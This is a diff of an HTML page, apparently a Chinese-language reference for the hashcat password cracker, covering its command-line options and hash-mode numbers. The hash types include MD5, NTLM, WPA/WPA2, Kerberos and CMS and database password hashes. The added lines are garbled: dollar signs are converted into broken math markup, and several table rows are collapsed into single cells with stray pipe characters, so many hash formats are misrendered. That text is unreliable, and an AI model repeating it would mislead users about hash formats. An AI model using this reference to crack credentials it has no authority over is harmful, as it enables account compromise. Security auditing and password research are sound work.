 <td>要使用的密匙文件，用逗号分隔</td>
-<td>–truecrypt-key=x.png</td>
+<td>--truecrypt-key=x.png</td>
 </tr>
-<tr>
-<td>–veracrypt-keyfiles</td>
+<tr class="even">
+<td>--veracrypt-keyfiles</td>
 <td>文件</td>
 <td>要使用的密匙文件，用逗号分隔</td>
-<td>–veracrypt-key=x.txt</td>
+<td>--veracrypt-key=x.txt</td>
 </tr>
-<tr>
-<td>–veracrypt-pim</td>
+<tr class="odd">
+<td>--veracrypt-pim</td>
 <td>数字</td>
 <td>VeraCrypt的头部密钥生成的迭代次数(PIM)</td>
-<td>–veracrypt-pim=1000</td>
+<td>--veracrypt-pim=1000</td>
 </tr>
-<tr>
-<td>-b,–benchmark</td>
+<tr class="even">
+<td>-b,--benchmark</td>
 <td></td>
 <td>运行基准测试</td>
 <td></td>
 </tr>
-<tr>
-<td>–speed-only</td>
+<tr class="odd">
+<td>--speed-only</td>
 <td></td>
 <td>返回预期的攻击速度，然后退出</td>
 <td></td>
 </tr>
-<tr>
-<td>–progress-only</td>
+<tr class="even">
+<td>--progress-only</td>
 <td></td>
 <td>返回理想进度的步骤大小和处理时间</td>
 <td></td>
 </tr>
-<tr>
-<td>-c,–segment-size</td>
+<tr class="odd">
+<td>-c,--segment-size</td>
 <td>数字</td>
 <td>为wordfile设置 X MB缓存</td>
 <td>-c 32</td>
 </tr>
-<tr>
-<td>–bitmap-min</td>
+<tr class="even">
+<td>--bitmap-min</td>
 <td>数字</td>
 <td>设置位图最小为X位(bit)</td>
-<td>–bitmap-min=24</td>
+<td>--bitmap-min=24</td>
 </tr>
-<tr>
-<td>–bitmap-max</td>
+<tr class="odd">
+<td>--bitmap-max</td>
 <td>数字</td>
 <td>设置位图最大为X位(bit)</td>
-<td>–bitmap-max=24</td>
+<td>--bitmap-max=24</td>
 </tr>
-<tr>
-<td>–cpu-affinity</td>
+<tr class="even">
+<td>--cpu-affinity</td>
 <td>字符串</td>
 <td>设置CPU相关性，用逗号分隔</td>
-<td>–cpu-affinity=1,2,3</td>
+<td>--cpu-affinity=1,2,3</td>
 </tr>
-<tr>
-<td>-I,–opencl-info</td>
+<tr class="odd">
+<td>-I,--opencl-info</td>
 <td></td>
 <td>显示检测到的OpenCL平台/设备的信息</td>
 <td>-I</td>
 </tr>
-<tr>
-<td>–opencl-platforms</td>
+<tr class="even">
+<td>--opencl-platforms</td>
 <td>字符串</td>
 <td>要使用的OpenCL平台，用逗号分隔</td>
-<td>–opencl-platforms=2</td>
+<td>--opencl-platforms=2</td>
 </tr>
-<tr>
-<td>-d,–opencl-devices</td>
+<tr class="odd">
+<td>-d,--opencl-devices</td>
 <td>字符串</td>
 <td>要使用的OpenCL设备，用逗号分隔</td>
 <td>-d 1</td>
 </tr>
-<tr>
-<td>-D,–opencl-device-types</td>
+<tr class="even">
+<td>-D,--opencl-device-types</td>
 <td>字符串</td>
 <td>要使用的OpenCL设备类型，用逗号分隔</td>
 <td>-D 1</td>
 </tr>
-<tr>
-<td>–opencl-vector-width</td>
+<tr class="odd">
+<td>--opencl-vector-width</td>
 <td>数字</td>
 <td>手动覆盖OpenCL矢量宽度为X</td>
-<td>–opencl-vector=4</td>
+<td>--opencl-vector=4</td>
 </tr>
-<tr>
-<td>-w,–workload-profile</td>
+<tr class="even">
+<td>-w,--workload-profile</td>
 <td>数字</td>
 <td>设置工作负载配置文件，参见下面的参考</td>
 <td>-w 3</td>
 </tr>
-<tr>
-<td>-n,–kernel-accel</td>
+<tr class="odd">
+<td>-n,--kernel-accel</td>
 <td>数字</td>
 <td>手动调整工作负载，将外圈步长设置为X</td>
 <td>-n 64</td>
 </tr>
-<tr>
-<td>-u,–kernel-loops</td>
+<tr class="even">
+<td>-u,--kernel-loops</td>
 <td>数字</td>
 <td>手动调整工作负载，将内圈步长设置为X</td>
 <td>-u 256</td>
 </tr>
-<tr>
-<td>–nvidia-spin-damp</td>
+<tr class="odd">
+<td>--nvidia-spin-damp</td>
 <td>数字</td>
 <td>可变通NVIDIA处理器热循环Bug，用百分比表示</td>
-<td>–nvidia-spin-damp=50</td>
+<td>--nvidia-spin-damp=50</td>
 </tr>
-<tr>
-<td>–gpu-temp-disable</td>
+<tr class="even">
+<td>--gpu-temp-disable</td>
 <td></td>
 <td>禁用GPU温度和风扇速度的读取和触发</td>
 <td></td>
 </tr>
-<tr>
-<td>–gpu-temp-abort</td>
+<tr class="odd">
+<td>--gpu-temp-abort</td>
 <td>数字</td>
 <td>如果GPU温度达到X摄氏度，则中止</td>
-<td>–gpu-temp-abort=100</td>
+<td>--gpu-temp-abort=100</td>
 </tr>
-<tr>
-<td>–gpu-temp-retain</td>
+<tr class="even">
+<td>--gpu-temp-retain</td>
 <td>数字</td>
 <td>尝试将GPU温度保持在X摄氏度</td>
-<td>–gpu-temp-retain=95</td>
+<td>--gpu-temp-retain=95</td>
 </tr>
-<tr>
-<td>–powertune-enable</td>
+<tr class="odd">
+<td>--powertune-enable</td>
 <td></td>
 <td>启用电源调整。 完成后恢复设置</td>
 <td></td>
 </tr>
-<tr>
-<td>–scrypt-tmto</td>
+<tr class="even">
+<td>--scrypt-tmto</td>
 <td>数字</td>
 <td>手动覆盖scrypt的TMTO值为X</td>
-<td>–scrypt-tmto=3</td>
+<td>--scrypt-tmto=3</td>
 </tr>
-<tr>
-<td>-s,–skip</td>
+<tr class="odd">
+<td>-s,--skip</td>
 <td>数字</td>
 <td>跳过前X个单词</td>
 <td>-s 1000000</td>
 </tr>
-<tr>
-<td>-l,–limit</td>
+<tr class="even">
+<td>-l,--limit</td>
 <td>数字</td>
 <td>跳过单词后限制X个单词</td>
 <td>-l 1000000</td>
 </tr>
-<tr>
-<td>–keyspace</td>
+<tr class="odd">
+<td>--keyspace</td>
 <td></td>
 <td>显示密钥空间base：mod值后退出</td>
 <td></td>
 </tr>
-<tr>
-<td>-j,–rule-left</td>
+<tr class="even">
+<td>-j,--rule-left</td>
 <td>规则</td>
 <td>单个规则应用于字典中左侧的每个单词</td>
-<td>-j ‘c’</td>
+<td>-j 'c'</td>
 </tr>
-<tr>
-<td>-k,–rule-right</td>
+<tr class="odd">
+<td>-k,--rule-right</td>
 <td>规则</td>
 <td>单个规则应用于字典中右侧的每个单词</td>
-<td>-k ‘^-‘</td>
+<td>-k '^-'</td>
 </tr>
-<tr>
-<td>-r,–rules-file</td>
+<tr class="even">
+<td>-r,--rules-file</td>
 <td>文件</td>
 <td>多个规则应用于字典中的每个单词</td>
 <td>-r rules/best64.rule</td>
 </tr>
-<tr>
-<td>-g,–generate-rules</td>
+<tr class="odd">
+<td>-g,--generate-rules</td>
 <td>数字</td>
 <td>生成X个随机规则</td>
 <td>-g 10000</td>
 </tr>
-<tr>
-<td>–generate-rules-func-min</td>
+<tr class="even">
+<td>--generate-rules-func-min</td>
 <td>数字</td>
 <td>强制每个规则最小X个函数</td>
 <td></td>
 </tr>
-<tr>
-<td>–generate-rules-func-max</td>
+<tr class="odd">
+<td>--generate-rules-func-max</td>
 <td>数字</td>
 <td>强制每个规则最大X个函数</td>
 <td></td>
 </tr>
-<tr>
-<td>–generate-rules-seed</td>
+<tr class="even">
+<td>--generate-rules-seed</td>
 <td>数字</td>
 <td>强制RNG种子设置为X</td>
 <td></td>
 </tr>
-<tr>
-<td>-1,–custom-charset1</td>
+<tr class="odd">
+<td>-1,--custom-charset1</td>
 <td>字符集</td>
 <td>用户定义的字符集 ?1</td>
 <td>-1 ?l?d?u</td>
 </tr>
-<tr>
-<td>-2,–custom-charset2</td>
+<tr class="even">
+<td>-2,--custom-charset2</td>
 <td>字符集</td>
 <td>用户定义的字符集 ?2</td>
 <td>-2 ?l?d?s</td>
 </tr>
-<tr>
-<td>-3,–custom-charset3</td>
+<tr class="odd">
+<td>-3,--custom-charset3</td>
 <td>字符集</td>
 <td>用户定义的字符集 ?3</td>
 <td></td>
 </tr>
-<tr>
-<td>-4,–custom-charset4</td>
+<tr class="even">
+<td>-4,--custom-charset4</td>
 <td>字符集</td>
 <td>用户定义的字符集 ?4</td>
 <td></td>
 </tr>
-<tr>
-<td>-i,–increment</td>
+<tr class="odd">
+<td>-i,--increment</td>
 <td></td>
 <td>启用掩码增量模式</td>
 <td></td>
 </tr>
-<tr>
-<td>–increment-min</td>
+<tr class="even">
+<td>--increment-min</td>
 <td>数字</td>
 <td>在X处开始掩码递增</td>
-<td>–increment-min=4</td>
+<td>--increment-min=4</td>
 </tr>
-<tr>
-<td>–increment-max</td>
+<tr class="odd">
+<td>--increment-max</td>
 <td>数字</td>
 <td>在X处停止掩码递增</td>
-<td>–increment-max=8</td>
+<td>--increment-max=8</td>
 </tr>
-</tbody></table>
-<h3 id="②-Hash种类"><a href="#②-Hash种类" class="headerlink" title="② Hash种类"></a>② Hash种类</h3><table>
+</tbody>
+</table>
+<h3 id="hash种类">② Hash种类</h3>
+<table>
+<colgroup>
+<col style="width: 5%">
+<col style="width: 52%">
+<col style="width: 42%">
+</colgroup>
 <thead>
-<tr>
+<tr class="header">
 <th>编号</th>
 <th>名称</th>
 <th>类别</th>
 </tr>
 </thead>
-<tbody><tr>
+<tbody>
+<tr class="odd">
 <td>900</td>
 <td>MD4</td>
 <td>纯Hash</td>
 </tr>
-<tr>
+<tr class="even">
 <td>0</td>
 <td>MD5</td>
 <td>纯Hash</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>5100</td>
 <td>Half MD5</td>
 <td>纯Hash</td>
 </tr>
-<tr>
+<tr class="even">
 <td>100</td>
 <td>SHA1</td>
 <td>纯Hash</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>1300</td>
 <td>SHA-224</td>
 <td>纯Hash</td>
 </tr>
-<tr>
+<tr class="even">
 <td>1400</td>
 <td>SHA-256</td>
 <td>纯Hash</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>10800</td>
 <td>SHA-384</td>
 <td>纯Hash</td>
 </tr>
-<tr>
+<tr class="even">
 <td>1700</td>
 <td>SHA-512</td>
 <td>纯Hash</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>5000</td>
 <td>SHA-3 (Keccak)</td>
 <td>纯Hash</td>
 </tr>
-<tr>
+<tr class="even">
 <td>10100</td>
 <td>SipHash</td>
 <td>纯Hash</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>6000</td>
 <td>RIPEMD-160</td>
 <td>纯Hash</td>
 </tr>
-<tr>
+<tr class="even">
 <td>6100</td>
 <td>Whirlpool</td>
 <td>纯Hash</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>6900</td>
 <td>GOST R 34.11-94</td>
 <td>纯Hash</td>
 </tr>
-<tr>
+<tr class="even">
 <td>11700</td>
 <td>GOST R 34.11-2012 (Streebog) 256-bit</td>
 <td>纯Hash</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>11800</td>
 <td>GOST R 34.11-2012 (Streebog) 512-bit</td>
 <td>纯Hash</td>
 </tr>
-<tr>
+<tr class="even">
 <td>10</td>
-<td>md5($pass.$salt)</td>
+<td>md5(<span class="math inline">\(pass.\)</span>salt)</td>
 <td>纯Hash，盐 且/或 多次迭代</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>20</td>
-<td>md5($salt.$pass)</td>
+<td>md5(<span class="math inline">\(salt.\)</span>pass)</td>
 <td>纯Hash，盐 且/或 多次迭代</td>
 </tr>
-<tr>
+<tr class="even">
 <td>30</td>
-<td>md5(unicode($pass).$salt)</td>
+<td>md5(unicode(<span class="math inline">\(pass).\)</span>salt)</td>
 <td>纯Hash，盐 且/或 多次迭代</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>40</td>
-<td>md5($salt.unicode($pass))</td>
+<td>md5(<span class="math inline">\(salt.unicode(\)</span>pass))</td>
 <td>纯Hash，盐 且/或 多次迭代</td>
 </tr>
-<tr>
+<tr class="even">
 <td>3800</td>
-<td>md5($salt.$pass.$salt)</td>
+<td>md5(<span class="math inline">\(salt.\)</span>pass.<span class="math inline">\(salt) | 纯Hash，盐 且/或 多次迭代 | | 3710 | md5(\)</span>salt.md5(<span class="math inline">\(pass)) | 纯Hash，盐 且/或 多次迭代 | | 4010 | md5(\)</span>salt.md5(<span class="math inline">\(salt.\)</span>pass))</td>
 <td>纯Hash，盐 且/或 多次迭代</td>
 </tr>
-<tr>
-<td>3710</td>
-<td>md5($salt.md5($pass))</td>
-<td>纯Hash，盐 且/或 多次迭代</td>
-</tr>
-<tr>
-<td>4010</td>
-<td>md5($salt.md5($salt.$pass))</td>
-<td>纯Hash，盐 且/或 多次迭代</td>
-</tr>
-<tr>
+<tr class="odd">
 <td>4110</td>
-<td>md5($salt.md5($pass.$salt))</td>
+<td>md5(<span class="math inline">\(salt.md5(\)</span>pass.<span class="math inline">\(salt)) | 纯Hash，盐 且/或 多次迭代 | | 2600 | md5(md5(\)</span>pass))</td>
 <td>纯Hash，盐 且/或 多次迭代</td>
 </tr>
-<tr>
-<td>2600</td>
-<td>md5(md5($pass))</td>
-<td>纯Hash，盐 且/或 多次迭代</td>
-</tr>
-<tr>
+<tr class="even">
 <td>3910</td>
-<td>md5(md5($pass).md5($salt))</td>
+<td>md5(md5(<span class="math inline">\(pass).md5(\)</span>salt))</td>
 <td>纯Hash，盐 且/或 多次迭代</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>4300</td>
-<td>md5(strtoupper(md5($pass)))</td>
+<td>md5(strtoupper(md5(<span class="math inline">\(pass))) | 纯Hash，盐 且/或 多次迭代 | | 4400 | md5(sha1(\)</span>pass))</td>
 <td>纯Hash，盐 且/或 多次迭代</td>
 </tr>
-<tr>
-<td>4400</td>
-<td>md5(sha1($pass))</td>
-<td>纯Hash，盐 且/或 多次迭代</td>
-</tr>
-<tr>
+<tr class="even">
 <td>110</td>
-<td>sha1($pass.$salt)</td>
+<td>sha1(<span class="math inline">\(pass.\)</span>salt)</td>
 <td>纯Hash，盐 且/或 多次迭代</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>120</td>
-<td>sha1($salt.$pass)</td>
+<td>sha1(<span class="math inline">\(salt.\)</span>pass)</td>
 <td>纯Hash，盐 且/或 多次迭代</td>
 </tr>
-<tr>
+<tr class="even">
 <td>130</td>
-<td>sha1(unicode($pass).$salt)</td>
+<td>sha1(unicode(<span class="math inline">\(pass).\)</span>salt)</td>
 <td>纯Hash，盐 且/或 多次迭代</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>140</td>
-<td>sha1($salt.unicode($pass))</td>
+<td>sha1(<span class="math inline">\(salt.unicode(\)</span>pass))</td>
 <td>纯Hash，盐 且/或 多次迭代</td>
 </tr>
-<tr>
+<tr class="even">
 <td>4500</td>
-<td>sha1(sha1($pass))</td>
+<td>sha1(sha1(<span class="math inline">\(pass)) | 纯Hash，盐 且/或 多次迭代 | | 4520 | sha1(\)</span>salt.sha1(<span class="math inline">\(pass)) | 纯Hash，盐 且/或 多次迭代 | | 4700 | sha1(md5(\)</span>pass))</td>
 <td>纯Hash，盐 且/或 多次迭代</td>
 </tr>
-<tr>
-<td>4520</td>
-<td>sha1($salt.sha1($pass))</td>
-<td>纯Hash，盐 且/或 多次迭代</td>
-</tr>
-<tr>
-<td>4700</td>
-<td>sha1(md5($pass))</td>
-<td>纯Hash，盐 且/或 多次迭代</td>
-</tr>
-<tr>
+<tr class="odd">
 <td>4900</td>
-<td>sha1($salt.$pass.$salt)</td>
+<td>sha1(<span class="math inline">\(salt.\)</span>pass.<span class="math inline">\(salt) | 纯Hash，盐 且/或 多次迭代 | | 14400 | sha1(CX) | 纯Hash，盐 且/或 多次迭代 | | 1410 | sha256(\)</span>pass.<span class="math inline">\(salt) | 纯Hash，盐 且/或 多次迭代 | | 1420 | sha256(\)</span>salt.<span class="math inline">\(pass) | 纯Hash，盐 且/或 多次迭代 | | 1430 | sha256(unicode(\)</span>pass).<span class="math inline">\(salt) | 纯Hash，盐 且/或 多次迭代 | | 1440 | sha256(\)</span>salt.unicode(<span class="math inline">\(pass)) | 纯Hash，盐 且/或 多次迭代 | | 1710 | sha512(\)</span>pass.<span class="math inline">\(salt) | 纯Hash，盐 且/或 多次迭代 | | 1720 | sha512(\)</span>salt.<span class="math inline">\(pass) | 纯Hash，盐 且/或 多次迭代 | | 1730 | sha512(unicode(\)</span>pass).<span class="math inline">\(salt) | 纯Hash，盐 且/或 多次迭代 | | 1740 | sha512(\)</span>salt.unicode($pass))</td>
 <td>纯Hash，盐 且/或 多次迭代</td>
 </tr>
-<tr>
-<td>14400</td>
-<td>sha1(CX)</td>
-<td>纯Hash，盐 且/或 多次迭代</td>
-</tr>
-<tr>
-<td>1410</td>
-<td>sha256($pass.$salt)</td>
-<td>纯Hash，盐 且/或 多次迭代</td>
-</tr>
-<tr>
-<td>1420</td>
-<td>sha256($salt.$pass)</td>
-<td>纯Hash，盐 且/或 多次迭代</td>
-</tr>
-<tr>
-<td>1430</td>
-<td>sha256(unicode($pass).$salt)</td>
-<td>纯Hash，盐 且/或 多次迭代</td>
-</tr>
-<tr>
-<td>1440</td>
-<td>sha256($salt.unicode($pass))</td>
-<td>纯Hash，盐 且/或 多次迭代</td>
-</tr>
-<tr>
-<td>1710</td>
-<td>sha512($pass.$salt)</td>
-<td>纯Hash，盐 且/或 多次迭代</td>
-</tr>
-<tr>
-<td>1720</td>
-<td>sha512($salt.$pass)</td>
-<td>纯Hash，盐 且/或 多次迭代</td>
-</tr>
-<tr>
-<td>1730</td>
-<td>sha512(unicode($pass).$salt)</td>
-<td>纯Hash，盐 且/或 多次迭代</td>
-</tr>
-<tr>
-<td>1740</td>
-<td>sha512($salt.unicode($pass))</td>
-<td>纯Hash，盐 且/或 多次迭代</td>
-</tr>
-<tr>
+<tr class="even">
 <td>50</td>
 <td>HMAC-MD5 (key = $pass)</td>
 <td>纯Hash，认证的</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>60</td>
 <td>HMAC-MD5 (key = $salt)</td>
 <td>纯Hash，认证的</td>
 </tr>
-<tr>
+<tr class="even">
 <td>150</td>
 <td>HMAC-SHA1 (key = $pass)</td>
 <td>纯Hash，认证的</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>160</td>
 <td>HMAC-SHA1 (key = $salt)</td>
 <td>纯Hash，认证的</td>
 </tr>
-<tr>
+<tr class="even">
 <td>1450</td>
 <td>HMAC-SHA256 (key = $pass)</td>
 <td>纯Hash，认证的</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>1460</td>
 <td>HMAC-SHA256 (key = $salt)</td>
 <td>纯Hash，认证的</td>
 </tr>
-<tr>
+<tr class="even">
 <td>1750</td>
 <td>HMAC-SHA512 (key = $pass)</td>
 <td>纯Hash，认证的</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>1760</td>
 <td>HMAC-SHA512 (key = $salt)</td>
 <td>纯Hash，认证的</td>
 </tr>
-<tr>
+<tr class="even">
 <td>14000</td>
 <td>DES (PT = $salt, key = $pass)</td>
 <td>纯加密，已知的明文攻击</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>14100</td>
 <td>3DES (PT = $salt, key = $pass)</td>
 <td>纯加密，已知的明文攻击</td>
 </tr>
-<tr>
+<tr class="even">
 <td>14900</td>
 <td>Skip32 (PT = $salt, key = $pass)</td>
 <td>纯加密，已知的明文攻击</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>400</td>
 <td>phpass</td>
 <td>通用密钥导出函数(KDF)</td>
 </tr>
-<tr>
+<tr class="even">
 <td>8900</td>
 <td>scrypt</td>
 <td>通用密钥导出函数(KDF)</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>11900</td>
 <td>PBKDF2-HMAC-MD5</td>
 <td>通用密钥导出函数(KDF)</td>
 </tr>
-<tr>
+<tr class="even">
 <td>12000</td>
 <td>PBKDF2-HMAC-SHA1</td>
 <td>通用密钥导出函数(KDF)</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>10900</td>
 <td>PBKDF2-HMAC-SHA256</td>
 <td>通用密钥导出函数(KDF)</td>
 </tr>
-<tr>
+<tr class="even">
 <td>12100</td>
 <td>PBKDF2-HMAC-SHA512</td>
 <td>通用密钥导出函数(KDF)</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>23</td>
 <td>Skype</td>
 <td>网络协议</td>
 </tr>
-<tr>
+<tr class="even">
 <td>2500</td>
 <td>WPA/WPA2</td>
 <td>网络协议</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>4800</td>
 <td>iSCSI CHAP authentication, MD5(CHAP)</td>
 <td>网络协议</td>
 </tr>
-<tr>
+<tr class="even">
 <td>5300</td>
 <td>IKE-PSK MD5</td>
 <td>网络协议</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>5400</td>
 <td>IKE-PSK SHA1</td>
 <td>网络协议</td>
 </tr>
-<tr>
+<tr class="even">
 <td>5500</td>
 <td>NetNTLMv1</td>
 <td>网络协议</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>5500</td>
 <td>NetNTLMv1+ESS</td>
 <td>网络协议</td>
 </tr>
-<tr>
+<tr class="even">
 <td>5600</td>
 <td>NetNTLMv2</td>
 <td>网络协议</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>7300</td>
 <td>IPMI2 RAKP HMAC-SHA1</td>
 <td>网络协议</td>
 </tr>
-<tr>
+<tr class="even">
 <td>7500</td>
 <td>Kerberos 5 AS-REQ Pre-Auth etype 23</td>
 <td>网络协议</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>8300</td>
 <td>DNSSEC (NSEC3)</td>
 <td>网络协议</td>
 </tr>
-<tr>
+<tr class="even">
 <td>10200</td>
 <td>CRAM-MD5</td>
 <td>网络协议</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>11100</td>
 <td>PostgreSQL CRAM (MD5)</td>
 <td>网络协议</td>
 </tr>
-<tr>
+<tr class="even">
 <td>11200</td>
 <td>MySQL CRAM (SHA1)</td>
 <td>网络协议</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>11400</td>
 <td>SIP digest authentication (MD5)</td>
 <td>网络协议</td>
 </tr>
-<tr>
+<tr class="even">
 <td>13100</td>
 <td>Kerberos 5 TGS-REP etype 23</td>
 <td>网络协议</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>121</td>
 <td>SMF (Simple Machines Forum) &gt; v1.1</td>
 <td>论坛，内容管理系统(CMS)，电子商务，框架</td>
 </tr>
-<tr>
+<tr class="even">
 <td>400</td>
 <td>phpBB3 (MD5)</td>
 <td>论坛，内容管理系统(CMS)，电子商务，框架</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>2611</td>
 <td>vBulletin &lt; v3.8.5</td>
 <td>论坛，内容管理系统(CMS)，电子商务，框架</td>
 </tr>
-<tr>
+<tr class="even">
 <td>2711</td>
 <td>vBulletin &gt;= v3.8.5</td>
 <td>论坛，内容管理系统(CMS)，电子商务，框架</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>2811</td>
 <td>MyBB 1.2+</td>
 <td>论坛，内容管理系统(CMS)，电子商务，框架</td>
 </tr>
-<tr>
+<tr class="even">
 <td>2811</td>
 <td>IPB2+ (Invision Power Board)</td>
 <td>论坛，内容管理系统(CMS)，电子商务，框架</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>8400</td>
 <td>WBB3 (Woltlab Burning Board)</td>
 <td>论坛，内容管理系统(CMS)，电子商务，框架</td>
 </tr>
-<tr>
+<tr class="even">
 <td>11</td>
 <td>Joomla &lt; 2.5.18</td>
 <td>论坛，内容管理系统(CMS)，电子商务，框架</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>400</td>
 <td>Joomla &gt;= 2.5.18 (MD5)</td>
 <td>论坛，内容管理系统(CMS)，电子商务，框架</td>
 </tr>
-<tr>
+<tr class="even">
 <td>400</td>
 <td>WordPress (MD5)</td>
 <td>论坛，内容管理系统(CMS)，电子商务，框架</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>2612</td>
 <td>PHPS</td>
 <td>论坛，内容管理系统(CMS)，电子商务，框架</td>
 </tr>
-<tr>
+<tr class="even">
 <td>7900</td>
 <td>Drupal7</td>
 <td>论坛，内容管理系统(CMS)，电子商务，框架</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>21</td>
 <td>osCommerce</td>
 <td>论坛，内容管理系统(CMS)，电子商务，框架</td>
 </tr>
-<tr>
+<tr class="even">
 <td>21</td>
 <td>xt:Commerce</td>
 <td>论坛，内容管理系统(CMS)，电子商务，框架</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>11000</td>
 <td>PrestaShop</td>
 <td>论坛，内容管理系统(CMS)，电子商务，框架</td>
 </tr>
-<tr>
+<tr class="even">
 <td>124</td>
 <td>Django (SHA-1)</td>
 <td>论坛，内容管理系统(CMS)，电子商务，框架</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>10000</td>
 <td>Django (PBKDF2-SHA256)</td>
 <td>论坛，内容管理系统(CMS)，电子商务，框架</td>
 </tr>
-<tr>
+<tr class="even">
 <td>3711</td>
 <td>MediaWiki B type</td>
 <td>论坛，内容管理系统(CMS)，电子商务，框架</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>13900</td>
 <td>OpenCart</td>
 <td>论坛，内容管理系统(CMS)，电子商务，框架</td>
 </tr>
-<tr>
+<tr class="even">
 <td>4521</td>
 <td>Redmine</td>
 <td>论坛，内容管理系统(CMS)，电子商务，框架</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>4522</td>
 <td>PunBB</td>
 <td>论坛，内容管理系统(CMS)，电子商务，框架</td>
 </tr>
-<tr>
+<tr class="even">
 <td>12001</td>
 <td>Atlassian (PBKDF2-HMAC-SHA1)</td>
 <td>论坛，内容管理系统(CMS)，电子商务，框架</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>12</td>
 <td>PostgreSQL</td>
 <td>数据库服务器</td>
 </tr>
-<tr>
+<tr class="even">
 <td>131</td>
 <td>MSSQL (2000)</td>
 <td>数据库服务器</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>132</td>
 <td>MSSQL (2005)</td>
 <td>数据库服务器</td>
 </tr>
-<tr>
+<tr class="even">
 <td>1731</td>
 <td>MSSQL (2012, 2014)</td>
 <td>数据库服务器</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>200</td>
 <td>MySQL323</td>
 <td>数据库服务器</td>
 </tr>
-<tr>
+<tr class="even">
 <td>300</td>
 <td>MySQL4.1/MySQL5</td>
 <td>数据库服务器</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>3100</td>
 <td>Oracle H: Type (Oracle 7+)</td>
 <td>数据库服务器</td>
 </tr>
-<tr>
+<tr class="even">
 <td>112</td>
 <td>Oracle S: Type (Oracle 11+)</td>
 <td>数据库服务器</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>12300</td>
 <td>Oracle T: Type (Oracle 12+)</td>
 <td>数据库服务器</td>
 </tr>
-<tr>
+<tr class="even">
 <td>8000</td>
 <td>Sybase ASE</td>
 <td>数据库服务器</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>141</td>
 <td>Episerver 6.x &lt; .NET 4</td>
 <td>HTTP，SMTP，LDAP服务器</td>
 </tr>
-<tr>
+<tr class="even">
 <td>1441</td>
 <td>Episerver 6.x &gt;= .NET 4</td>
 <td>HTTP，SMTP，LDAP服务器</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>1600</td>
-<td>Apache $apr1$ MD5, md5apr1, MD5 (APR)</td>
+<td>Apache <span class="math inline">\(apr1\)</span> MD5, md5apr1, MD5 (APR)</td>
 <td>HTTP，SMTP，LDAP服务器</td>
 </tr>
-<tr>
+<tr class="even">
 <td>12600</td>
 <td>ColdFusion 10+</td>
 <td>HTTP，SMTP，LDAP服务器</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>1421</td>
 <td>hMailServer</td>
 <td>HTTP，SMTP，LDAP服务器</td>
 </tr>
-<tr>
+<tr class="even">
 <td>101</td>
 <td>nsldap, SHA-1(Base64), Netscape LDAP SHA</td>
 <td>HTTP，SMTP，LDAP服务器</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>111</td>
 <td>nsldaps, SSHA-1(Base64), Netscape LDAP SSHA</td>
 <td>HTTP，SMTP，LDAP服务器</td>
 </tr>
-<tr>
+<tr class="even">
 <td>1411</td>
 <td>SSHA-256(Base64), LDAP {SSHA256}</td>
 <td>HTTP，SMTP，LDAP服务器</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>1711</td>
 <td>SSHA-512(Base64), LDAP {SSHA512}</td>
 <td>HTTP，SMTP，LDAP服务器</td>
 </tr>
-<tr>
+<tr class="even">
 <td>15000</td>
 <td>FileZilla Server &gt;= 0.9.55</td>
 <td>FTP 服务器</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>11500</td>
 <td>CRC32</td>
 <td>校验和</td>
 </tr>
-<tr>
+<tr class="even">
 <td>3000</td>
 <td>LM</td>
 <td>操作系统</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>1000</td>
 <td>NTLM</td>
 <td>操作系统</td>
 </tr>
-<tr>
+<tr class="even">
 <td>1100</td>
 <td>Domain Cached Credentials (DCC), MS Cache</td>
 <td>操作系统</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>2100</td>
 <td>Domain Cached Credentials 2 (DCC2), MS Cache 2</td>
 <td>操作系统</td>
 </tr>
-<tr>
+<tr class="even">
 <td>12800</td>
-<td>MS-AzureSync  PBKDF2-HMAC-SHA256</td>
+<td>MS-AzureSync PBKDF2-HMAC-SHA256</td>
 <td>操作系统</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>1500</td>
 <td>descrypt, DES (Unix), Traditional DES</td>
 <td>操作系统</td>
 </tr>
-<tr>
